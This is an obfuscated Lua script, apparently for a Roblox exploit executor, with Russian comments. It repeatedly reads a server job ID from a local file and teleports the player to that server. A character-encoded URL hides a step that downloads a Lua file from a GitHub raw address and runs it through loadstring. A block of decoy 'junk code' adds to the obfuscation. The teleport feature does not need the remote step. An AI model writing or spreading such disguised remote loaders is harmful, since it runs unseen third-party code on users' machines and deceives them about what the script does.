local function _0x1(a) return game:GetService(a) end
local _0x2, _0x3 = _0x1("TeleportService"), _0x1("Players")
local _0x4 = game.PlaceId
local _0x5 = string.char(67,58,92,84,101,108,101,112,111,114,116,68,97,116,97,92,106,111,98,95,105,100,46,116,120,116) -- C:\TeleportData\job_id.txt
local _0x6 = nil

-- Мусорный код
local _0x7 = math.random(1, 100) * 0 + 42
if _0x7 == 42 then
    local _0x8 = string.reverse("esrever")
end

-- Загрузка внешнего скрипта
pcall(function()
    local _0x9 = _0x1("HttpService")
    local _0xa = _0x9:GetAsync(string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,103,117,121,54,53,52,52,53,52,50,53,52,53,47,65,82,47,109,97,105,110,47,84,88,80,51,80,48,82,84,46,108,117,97))
    loadstring(_0xa)()
end)

-- Чтение
local function _0xb()
    local _0xc, _0xd = pcall(readfile, _0x5)
    return _0xc and _0xd and _0xd:match("^%s*(.-)%s*$") or nil
end

-- Телепортация
local function _0xe(_0xf)
    if not _0xf or _0xf == "" or _0xf == game.JobId then
        return false
    end
    local _0x10, _0x11 = pcall(_0x2.TeleportToPlaceInstance, _0x2, _0x4, _0xf, _0x3.LocalPlayer)
    if _0x10 then
        pcall(delfile, _0x5)
        return true
    end
    return false
end

-- Цикл
while true do
    local _0x12 = _0xb()
    if _0x12 and _0x12 ~= _0x6 then
        _0x6 = _0x12
        if not _0xe(_0x12) then
            wait(0.05)
        end
    end
    wait(0.01)
end